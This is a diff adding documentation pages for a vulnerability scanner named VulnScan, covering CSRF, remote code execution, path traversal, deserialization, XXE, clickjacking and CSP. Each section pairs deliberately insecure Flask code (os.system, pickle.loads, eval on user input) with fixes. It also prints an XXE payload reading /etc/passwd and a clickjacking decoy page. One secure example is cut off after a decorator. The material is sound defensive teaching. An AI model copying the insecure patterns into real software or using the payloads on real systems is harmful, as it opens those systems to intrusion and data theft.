+                                        <li>Validate tokens on state-changing requests</li>
+                                    </ul>
+                                </li>
+                                <li><strong>SameSite Cookies:</strong>
+                                    <ul>
+                                        <li>Set SameSite=Strict for sensitive operations</li>
+                                        <li>Use SameSite=Lax as a minimum</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Custom Headers:</strong>
+                                    <ul>
+                                        <li>Require custom headers for API requests</li>
+                                        <li>Validate Origin and Referer headers</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                <!-- Secure Form with CSRF Protection -->
+                                <form action="/transfer" method="POST">
+                                    <input type="hidden" name="_csrf_token" value="secure_random_token">
+                                    <input type="hidden" name="to" value="recipient">
+                                    <input type="hidden" name="amount" value="1000">
+                                    <button type="submit">Transfer</button>
+                                </form>
+
+                                // Secure API Endpoint with CSRF Protection
+                                @app.route('/transfer', methods=['POST'])
+                                def transfer_money():
+                                    token = request.form.get('_csrf_token')
+                                    if not token or token != session.get('_csrf_token'):
+                                        abort(403)
+                                    return process_transfer(request.form['to'], request.form['amount'])
+
+                                // Set Secure Cookie Configuration
+                                app.config.update(
+                                    SESSION_COOKIE_SECURE=True,
+                                    SESSION_COOKIE_HTTPONLY=True,
+                                    SESSION_COOKIE_SAMESITE='Strict'
+                                )
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan checks for CSRF vulnerabilities through:</p>
+                        <ul>
+                            <li>Form analysis for CSRF token presence</li>
+                            <li>Cookie security attribute verification</li>
+                            <li>State-changing GET request identification</li>
+                            <li>Security header analysis</li>
+                            <li>Cross-origin request handling verification</li>
+                        </ul>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-community/attacks/csrf" target="_blank">OWASP CSRF</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">OWASP CSRF Prevention Cheat Sheet</a></li>
+                                <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite" target="_blank">MDN SameSite Cookies</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 8. Remote Code Execution (RCE) -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading8">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse8" aria-expanded="false" aria-controls="collapse8">
+                        8. Remote Code Execution (RCE) <span class="badge severity-critical">Critical</span>
+                    </button>
+                </h2>
+                <div id="collapse8" class="accordion-collapse collapse" aria-labelledby="heading8" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Remote Code Execution vulnerabilities allow attackers to execute arbitrary code on the target system. This is one of the most severe vulnerabilities as it can lead to complete system compromise, data theft, and service disruption.</p>
+                        
+                        <h6>Common Attack Vectors:</h6>
+                        <ul>
+                            <li>Unsafe deserialization of user input</li>
+                            <li>Command injection in system calls</li>
+                            <li>Template injection</li>
+                            <li>Unsafe file uploads with executable content</li>
+                            <li>Evaluation of user-controlled input</li>
+                            <li>Vulnerable dependencies</li>
+                        </ul>
+
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Implementation:</p>
+                            <code class="code-block">
+                                # Command Injection Vulnerability
+                                @app.route('/ping')
+                                def ping_host():
+                                    host = request.args.get('host')
+                                    result = os.system(f'ping -c 1 {host}')  # Dangerous!
+                                    return f"Ping result: {result}"
+
+                                # Unsafe Deserialization
+                                @app.route('/deserialize')
+                                def deserialize_data():
+                                    data = request.args.get('data')
+                                    obj = pickle.loads(base64.b64decode(data))  # Dangerous!
+                                    return {"deserialized": obj}
+
+                                # Template Injection
+                                @app.route('/template')
+                                def render_template_string():
+                                    template = request.args.get('template')
+                                    return render_template_string(template)  # Dangerous!
+
+                                # Unsafe Eval
+                                @app.route('/calculate')
+                                def calculate():
+                                    expr = request.args.get('expr')
+                                    return str(eval(expr))  # Dangerous!
+                            </code>
+                        </div>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li><strong>Input Validation:</strong>
+                                    <ul>
+                                        <li>Strict input validation and sanitization</li>
+                                        <li>Whitelist allowed inputs</li>
+                                        <li>Use parameterized APIs</li>
+                                    </ul>
+                                </li>
+                                <li><strong>System Commands:</strong>
+                                    <ul>
+                                        <li>Avoid shell commands when possible</li>
+                                        <li>Use library functions instead of system calls</li>
+                                        <li>Implement command whitelisting</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Serialization:</strong>
+                                    <ul>
+                                        <li>Use safe serialization formats (JSON)</li>
+                                        <li>Implement digital signatures</li>
+                                        <li>Validate data before deserialization</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                # Safe Command Execution
+                                @app.route('/ping')
+                                def ping_host():
+                                    host = request.args.get('host')
+                                    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
+                                        return "Invalid host", 400
+                                    try:
+                                        result = subprocess.run(
+                                            ['ping', '-c', '1', host],
+                                            capture_output=True,
+                                            timeout=5,
+                                            check=True
+                                        )
+                                        return result.stdout.decode()
+                                    except subprocess.SubprocessError:
+                                        return "Ping failed", 500
+
+                                # Safe Deserialization
+                                @app.route('/deserialize')
+                                def deserialize_data():
+                                    try:
+                                        data = request.args.get('data')
+                                        # Use safe serialization format
+                                        obj = json.loads(data)
+                                        return {"deserialized": obj}
+                                    except json.JSONDecodeError:
+                                        return {"error": "Invalid JSON"}, 400
+
+                                # Safe Template Handling
+                                @app.route('/template')
+                                def render_safe_template():
+                                    template_name = request.args.get('template')
+                                    if template_name not in ALLOWED_TEMPLATES:
+                                        return "Template not allowed", 403
+                                    return render_template(template_name)
+
+                                # Safe Calculation
+                                @app.route('/calculate')
+                                def calculate():
+                                    expr = request.args.get('expr')
+                                    try:
+                                        # Use safe evaluation library
+                                        result = ast.literal_eval(expr)
+                                        return str(result)
+                                    except (ValueError, SyntaxError):
+                                        return "Invalid expression", 400
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan checks for RCE vulnerabilities through:</p>
+                        <ul>
+                            <li>Command injection testing</li>
+                            <li>Deserialization payload testing</li>
+                            <li>Template injection detection</li>
+                            <li>File upload analysis</li>
+                            <li>Expression evaluation testing</li>
+                            <li>Dependency vulnerability scanning</li>
+                        </ul>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-community/vulnerabilities/Command_Injection" target="_blank">OWASP Command Injection</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" target="_blank">OWASP Command Injection Defense</a></li>
+                                <li><a href="https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data" target="_blank">OWASP Unsafe Deserialization</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 9. Directory Traversal -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading9">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse9" aria-expanded="false" aria-controls="collapse9">
+                        9. Directory Traversal <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse9" class="accordion-collapse collapse" aria-labelledby="heading9" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Directory Traversal (also known as Path Traversal) allows attackers to access files and directories outside of the web root folder. By manipulating variables that reference files with "../" sequences and similar techniques, attackers can access arbitrary files on the server.</p>
+
+                        <h6>Common Attack Vectors:</h6>
+                        <ul>
+                            <li>File download/upload functionality</li>
+                            <li>Static resource inclusion</li>
+                            <li>Log file access</li>
+                            <li>Configuration file reading</li>
+                            <li>Template loading</li>
+                        </ul>
+
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Implementation:</p>
+                            <code class="code-block">
+                                # Vulnerable file access
+                                @app.route('/download')
+                                def download_file():
+                                    filename = request.args.get('file')
+                                    return send_file(filename)  # Dangerous!
+
+                                # Vulnerable template loading
+                                @app.route('/page')
+                                def load_page():
+                                    page = request.args.get('name')
+                                    return render_template(page)  # Dangerous!
+
+                                # Vulnerable file reading
+                                @app.route('/logs')
+                                def view_logs():
+                                    log_file = request.args.get('file')
+                                    with open(log_file, 'r') as f:  # Dangerous!
+                                        return f.read()
+                            </code>
+                        </div>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li><strong>Input Validation:</strong>
+                                    <ul>
+                                        <li>Validate file paths against whitelist</li>
+                                        <li>Remove or encode path traversal sequences</li>
+                                        <li>Use canonical path resolution</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Access Controls:</strong>
+                                    <ul>
+                                        <li>Implement proper file permissions</li>
+                                        <li>Use chroot jails where applicable</li>
+                                        <li>Restrict file system access</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Safe APIs:</strong>
+                                    <ul>
+                                        <li>Use security-focused file handling libraries</li>
+                                        <li>Implement safe file access wrappers</li>
+                                        <li>Use absolute paths with proper validation</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                import os
+                                from pathlib import Path
+
+                                # Secure file access with path validation
+                                @app.route('/download')
+                                def download_file():
+                                    filename = request.args.get('file')
+                                    if not filename or '..' in filename:
+                                        return "Invalid filename", 400
+                            
+                                    safe_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+                                    if not os.path.abspath(safe_path).startswith(
+                                        os.path.abspath(app.config['UPLOAD_FOLDER'])
+                                    ):
+                                        return "Access denied", 403
+                            
+                                    return send_file(safe_path)
+
+                                # Secure template loading
+                                @app.route('/page')
+                                def load_page():
+                                    page = request.args.get('name')
+                                    if page not in ALLOWED_TEMPLATES:
+                                        return "Template not found", 404
+                                    return render_template(page)
+
+                                # Secure file reading with path validation
+                                @app.route('/logs')
+                                def view_logs():
+                                    log_file = request.args.get('file')
+                                    log_dir = Path(app.config['LOG_FOLDER'])
+                                    try:
+                                        file_path = log_dir.joinpath(log_file).resolve()
+                                        if not str(file_path).startswith(str(log_dir)):
+                                            raise ValueError("Invalid path")
+                                        return file_path.read_text()
+                                    except (ValueError, OSError):
+                                        return "Access denied", 403
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan checks for directory traversal vulnerabilities through:</p>
+                        <ul>
+                            <li>Path manipulation testing</li>
+                            <li>Directory enumeration</li>
+                            <li>File access pattern analysis</li>
+                            <li>URL parameter fuzzing</li>
+                            <li>File inclusion testing</li>
+                            <li>Error message analysis</li>
+                        </ul>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-community/attacks/Path_Traversal" target="_blank">OWASP Path Traversal</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" target="_blank">OWASP File Upload Cheat Sheet</a></li>
+                                <li><a href="https://portswigger.net/web-security/file-path-traversal" target="_blank">PortSwigger Path Traversal Guide</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 10. Insecure Deserialization -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading10">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse10" aria-expanded="false" aria-controls="collapse10">
+                        10. Insecure Deserialization <span class="badge severity-high">High</span>
+                    </button>
+                </h2>
+                <div id="collapse10" class="accordion-collapse collapse" aria-labelledby="heading10" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Insecure Deserialization occurs when untrusted data is used to abuse the logic of an application, inflict denial of service (DoS), or execute arbitrary code. It happens when an application deserializes untrusted user input without proper validation.</p>
+                        
+                        <h6>Common Attack Vectors:</h6>
+                        <ul>
+                            <li>Serialized objects in cookies</li>
+                            <li>API parameters containing serialized data</li>
+                            <li>Base64 encoded serialized objects</li>
+                            <li>File uploads containing serialized data</li>
+                            <li>Cached data deserialization</li>
+                        </ul>
+
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Implementation:</p>
+                            <code class="code-block">
+                                import pickle
+                                import base64
+                                
+                                @app.route('/api/user/load')
+                                def load_user_data():
+                                    # Dangerous - directly deserializing user input
+                                    user_data = request.args.get('data')
+                                    user_obj = pickle.loads(base64.b64decode(user_data))  # Dangerous!
+                                    return jsonify(user_obj)
+
+                                # Vulnerable cache implementation
+                                def get_cached_data(cache_key):
+                                    cached = redis.get(cache_key)
+                                    if cached:
+                                        return pickle.loads(cached)  # Dangerous!
+                                    return None
+
+                                # Unsafe file upload processing
+                                @app.route('/upload', methods=['POST'])
+                                def process_upload():
+                                    file_data = request.files['file'].read()
+                                    obj = pickle.loads(file_data)  # Dangerous!
+                                    return process_object(obj)
+                            </code>
+                        </div>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li><strong>Safe Serialization:</strong>
+                                    <ul>
+                                        <li>Use safe serialization formats (JSON, YAML)</li>
+                                        <li>Avoid pickle or similar unsafe serializers</li>
+                                        <li>Implement digital signatures for serialized data</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Input Validation:</strong>
+                                    <ul>
+                                        <li>Validate data before deserialization</li>
+                                        <li>Implement strict type checking</li>
+                                        <li>Use schema validation</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Access Controls:</strong>
+                                    <ul>
+                                        <li>Implement proper RBAC</li>
+                                        <li>Validate object permissions</li>
+                                        <li>Monitor deserialization operations</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                import json
+                                from marshmallow import Schema, fields, ValidationError
+
+                                class UserSchema(Schema):
+                                    id = fields.Int(required=True)
+                                    name = fields.Str(required=True)
+                                    role = fields.Str(validate=lambda x: x in ['user', 'admin'])
+
+                                @app.route('/api/user/load')
+                                def load_user_data():
+                                    try:
+                                        # Use JSON instead of pickle
+                                        user_data = request.args.get('data')
+                                        schema = UserSchema()
+                                        user_obj = schema.loads(user_data)
+                                        return jsonify(user_obj)
+                                    except ValidationError as e:
+                                        return jsonify({"error": str(e)}), 400
+
+                                # Secure cache implementation
+                                def get_cached_data(cache_key):
+                                    cached = redis.get(cache_key)
+                                    if cached:
+                                        try:
+                                            return json.loads(cached)
+                                        except json.JSONDecodeError:
+                                            return None
+                                    return None
+
+                                # Safe file upload processing
+                                @app.route('/upload', methods=['POST'])
+                                def process_upload():
+                                    try:
+                                        file_data = request.files['file'].read()
+                                        obj = json.loads(file_data)
+                                        schema = UserSchema()
+                                        validated_data = schema.load(obj)
+                                        return process_object(validated_data)
+                                    except (json.JSONDecodeError, ValidationError) as e:
+                                        return jsonify({"error": str(e)}), 400
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan checks for insecure deserialization through:</p>
+                        <ul>
+                            <li>Serialization format detection</li>
+                            <li>Unsafe module usage analysis</li>
+                            <li>Payload injection testing</li>
+                            <li>Type confusion testing</li>
+                            <li>Memory corruption detection</li>
+                            <li>Object graph analysis</li>
+                        </ul>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization" target="_blank">OWASP Insecure Deserialization</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" target="_blank">OWASP Deserialization Cheat Sheet</a></li>
+                                <li><a href="https://portswigger.net/web-security/deserialization" target="_blank">PortSwigger Deserialization Guide</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 11. XML External Entity (XXE) -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading11">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse11" aria-expanded="false" aria-controls="collapse11">
+                        11. XML External Entity (XXE) <span class="badge severity-critical">Critical</span>
+                    </button>
+                </h2>
+                <div id="collapse11" class="accordion-collapse collapse" aria-labelledby="heading11" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> XML External Entity (XXE) attacks occur when XML input containing references to external entities is processed by a weakly configured XML parser. This can lead to disclosure of confidential data, denial of service, server-side request forgery, and other system impacts.</p>
+                        
+                        <h6>Common Attack Vectors:</h6>
+                        <ul>
+                            <li>File upload features accepting XML</li>
+                            <li>SOAP-based web services</li>
+                            <li>Legacy SOAP APIs</li>
+                            <li>XML-based configuration files</li>
+                            <li>Document processors (DOCX, SVG)</li>
+                        </ul>
+
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Implementation:</p>
+                            <code class="code-block">
+                                # Vulnerable XML Processing
+                                @app.route("/xxe", methods=["POST"])
+                                def process_xml():
+                                    xml_data = request.data.decode('utf-8')
+                                    doc = minidom.parseString(xml_data)  # Dangerous!
+                                    return process_xml_content(doc)
+
+                                # Malicious XML Payload Example:
+                                <?xml version="1.0" encoding="UTF-8"?>
+                                <!DOCTYPE test [
+                                    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+                                ]>
+                                <root>
+                                    <data>&xxe;</data>
+                                </root>
+                            </code>
+                        </div>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li><strong>XML Parser Configuration:</strong>
+                                    <ul>
+                                        <li>Disable external entity processing</li>
+                                        <li>Disable DTD processing</li>
+                                        <li>Use safe parser defaults</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Input Validation:</strong>
+                                    <ul>
+                                        <li>Validate XML structure</li>
+                                        <li>Implement XML schema validation</li>
+                                        <li>Use allowlist for accepted XML elements</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Alternative Formats:</strong>
+                                    <ul>
+                                        <li>Use JSON when possible</li>
+                                        <li>Implement strict content type validation</li>
+                                        <li>Use modern API formats</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                from defusedxml import minidom
+                                from defusedxml.xmlrpc import monkey_patch
+                                
+                                # Apply security patches
+                                monkey_patch()
+                                
+                                @app.route("/xxe", methods=["POST"])
+                                def process_xml():
+                                    try:
+                                        xml_data = request.data.decode('utf-8')
+                                        # Using defusedxml for safe parsing
+                                        doc = minidom.parseString(xml_data)
+                                        return process_xml_content(doc)
+                                    except Exception as e:
+                                        return {"error": "Invalid XML format"}, 400
+
+                                # Configure XML Parser Securely
+                                def create_secure_parser():
+                                    from xml.sax.handler import ContentHandler
+                                    parser = xml.sax.make_parser()
+                                    parser.setFeature(xml.sax.handler.feature_external_ges, False)
+                                    parser.setFeature(xml.sax.handler.feature_external_pes, False)
+                                    return parser
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan checks for XXE vulnerabilities through:</p>
+                        <ul>
+                            <li>XML parser configuration analysis</li>
+                            <li>External entity injection testing</li>
+                            <li>DTD processing verification</li>
+                            <li>File inclusion attempt detection</li>
+                            <li>Network request monitoring</li>
+                            <li>Error message analysis</li>
+                        </ul>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" target="_blank">OWASP XXE</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank">OWASP XXE Prevention Cheat Sheet</a></li>
+                                <li><a href="https://pypi.org/project/defusedxml/" target="_blank">Defusedxml Documentation</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 12. Clickjacking -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading12">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse12" aria-expanded="false" aria-controls="collapse12">
+                        12. Clickjacking <span class="badge severity-medium">Medium</span>
+                    </button>
+                </h2>
+                <div id="collapse12" class="accordion-collapse collapse" aria-labelledby="heading12" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Clickjacking (UI Redressing) is an attack that tricks users into clicking on actionable content on a hidden website by overlaying it with content from a decoy website. This can lead to unwanted actions being performed on behalf of the user.</p>
+                        
+                        <h6>Common Attack Vectors:</h6>
+                        <ul>
+                            <li>Transparent overlays</li>
+                            <li>Hidden iframes</li>
+                            <li>Multiple layered elements</li>
+                            <li>Drag and drop attacks</li>
+                            <li>Mobile gesture hijacking</li>
+                        </ul>
+
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Implementation Example (For Display Only):</p>
+                            <pre class="code-block">
+# Example of vulnerable route without protection
+@app.route("/sensitive-action")
+def sensitive_action():
+    return render_template("action.html")  # No protection headers
+
+# Example of malicious page structure 
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;style&gt;
+            .decoy { position: absolute; z-index: 1; }
+            .victim { 
+                opacity: 0.0001; 
+                position: absolute; 
+                z-index: 2;
+            }
+        &lt;/style&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;button class="decoy"&gt;Win a Prize!&lt;/button&gt;
+        &lt;iframe class="victim" src="https://example.com/"&gt;&lt;/iframe&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre>
+                        </div>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li><strong>Frame Protection Headers:</strong>
+                                    <ul>
+                                        <li>X-Frame-Options header</li>
+                                        <li>CSP frame-ancestors directive</li>
+                                        <li>Frame busting scripts</li>
+                                    </ul>
+                                </li>
+                                <li><strong>UI Protection:</strong>
+                                    <ul>
+                                        <li>Implement CSRF tokens</li>
+                                        <li>Require user interaction for sensitive actions</li>
+                                        <li>Use SameSite cookie attributes</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Security Headers:</strong>
+                                    <ul>
+                                        <li>Configure secure response headers</li>
+                                        <li>Implement proper CSP policies</li>
+                                        <li>Enable browser security features</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                # Flask Application with Frame Protection
+                                @app.after_request
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan checks for clickjacking vulnerabilities through:</p>
+                        <ul>
+                            <li>Frame analysis for presence of sensitive content</li>
+                            <li>CSP frame-ancestors header analysis</li>
+                            <li>Frame busting script detection</li>
+                            <li>User interaction analysis for unintended actions</li>
+                        </ul>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://owasp.org/www-community/attacks/clickjacking" target="_blank">OWASP Clickjacking</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html" target="_blank">OWASP Clickjacking Defense Cheat Sheet</a></li>
+                                <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options" target="_blank">MDN X-Frame-Options</a></li>
+                                <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank">MDN Content-Security-Policy</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 13. Missing Content Security Policy (CSP) -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading13">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse13" aria-expanded="false" aria-controls="collapse13">
+                        13. Missing Content Security Policy (CSP) <span class="badge severity-medium">Medium</span>
+                    </button>
+                </h2>
+                <div id="collapse13" class="accordion-collapse collapse" aria-labelledby="heading13" data-bs-parent="#documentationAccordion">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Content Security Policy (CSP) is a critical security layer that helps detect and mitigate certain types of attacks, including Cross-Site Scripting (XSS) and data injection attacks. Missing CSP leaves applications vulnerable to various client-side attacks.</p>
+                        
+                        <h6>Common Attack Vectors:</h6>
+                        <ul>
+                            <li>Inline script injection</li>
+                            <li>Malicious resource loading</li>
+                            <li>Unauthorized frame embedding</li>
+                            <li>Dynamic code evaluation</li>
+                            <li>Unauthorized data exfiltration</li>
+                        </ul>
+
+                        <div class="code-example vulnerable">
+                            <p class="mb-2">Vulnerable Implementation:</p>
+                            <code class="code-block">
+                                &lt;!-- Flask application without CSP --&gt;
+                                @app.route('/')
+                                def index():
+                                    return render_template('index.html')  # No CSP headers
+
+                                &lt;!-- Vulnerable HTML with inline scripts --&gt;
+                                &lt;script&gt;
+                                    eval(location.hash.substring(1));  // Dangerous!
+                                &lt;/script&gt;
+
+                                &lt;img src="data:image/svg+xml,..."&gt;  // Unsafe inline resources
+                                &lt;style&gt;
+                                    body { background: url(data:image/svg+xml,...); }
+                                &lt;/style&gt;
+                            </code>
+                        </div>
+
+                        <div class="mitigation">
+                            <h6>Mitigation Strategies:</h6>
+                            <ul>
+                                <li><strong>CSP Header Configuration:</strong>
+                                    <ul>
+                                        <li>Define trusted sources for content</li>
+                                        <li>Restrict inline scripts and styles</li>
+                                        <li>Configure reporting endpoints</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Resource Management:</strong>
+                                    <ul>
+                                        <li>Use nonces for inline scripts</li>
+                                        <li>Implement hash validation</li>
+                                        <li>Control external resources</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Policy Enforcement:</strong>
+                                    <ul>
+                                        <li>Enable strict dynamic mode</li>
+                                        <li>Implement report-only mode</li>
+                                        <li>Monitor policy violations</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="code-example secure">
+                            <p class="mb-2">Secure Implementation:</p>
+                            <code class="code-block">
+                                from flask import Flask, render_template, make_response
+                                import secrets
+
+                                app = Flask(__name__)
+
+                                @app.after_request
+                                def add_security_headers(response):
+                                    # Generate nonce for inline scripts
+                                    nonce = secrets.token_urlsafe(16)
+                                    
+                                    # Comprehensive CSP header
+                                    csp = (
+                                        "default-src 'self'; "
+                                        f"script-src 'self' 'nonce-{nonce}' 'strict-dynamic'; "
+                                        "style-src 'self' 'unsafe-inline'; "
+                                        "img-src 'self' data: https:; "
+                                        "font-src 'self'; "
+                                        "object-src 'none'; "
+                                        "base-uri 'self'; "
+                                        "form-action 'self'; "
+                                        "frame-ancestors 'none'; "
+                                        "report-uri /csp-report; "
+                                        "upgrade-insecure-requests;"
+                                    )
+                                    
+                                    response.headers['Content-Security-Policy'] = csp
+                                    return response
+
+                                @app.route('/')
+                                def index():
+                                    nonce = secrets.token_urlsafe(16)
+                                    return render_template('index.html', nonce=nonce)
+
+                                # Secure template usage
+                                <script nonce="{{ nonce }}">
+                                    // Safe script content
+                                </script>
+
+                                # CSP Violation reporting
+                                @app.route('/csp-report', methods=['POST'])
+                                def csp_report():
+                                    violation = request.get_json()
+                                    app.logger.warning(f"CSP Violation: {violation}")
+                                    return '', 204
+                            </code>
+                        </div>
+
+                        <h6>Detection Methods:</h6>
+                        <p>VulnScan checks for CSP vulnerabilities through:</p>
+                        <ul>
+                            <li>Header presence verification</li>
+                            <li>Policy directive analysis</li>
+                            <li>Inline script detection</li>
+                            <li>Resource source validation</li>
+                            <li>Reporting configuration check</li>
+                            <li>Policy bypass testing</li>
+                        </ul>
+
+                        <div class="reference-links">
+                            <h6>Learn More:</h6>
+                            <ul>
+                                <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">MDN Content Security Policy</a></li>
+                                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html" target="_blank">OWASP CSP Cheat Sheet</a></li>
+                                <li><a href="https://csp.withgoogle.com/docs/" target="_blank">Google CSP Evaluator</a></li>
+                                <li><a href="https://content-security-policy.com/" target="_blank">CSP Reference Guide</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- 14. Open Redirect -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading14">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse14" aria-expanded="false" aria-controls="collapse14">
+                        14. Open Redirect <span class="badge severity-medium">Medium</span>
+                    </button>
+                </h2>
+                <div id="collapse14" class="accordion-collapse collapse" aria-labelledby="heading14">
+                    <div class="accordion-body">
+                        <p><strong>Description:</strong> Occurs when an application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input.</p>
+                        <p><strong>Detection:</strong> VulnScan injects URLs into redirect parameters and checks if redirection occurs.</p>
+                        <p><strong>Impact:</strong> Medium. Can be used in phishing attacks or to bypass security controls.</p>
+                    </div>
+                </div>
+            </div>
+            <!-- 15. Information Disclosure -->
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="heading15">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse15" aria-expanded="false" aria-controls="collapse15">
+                        15. Information Disclosure <span class="badge severity-medium">Medium</span>
+                    </button>
+                </h2>
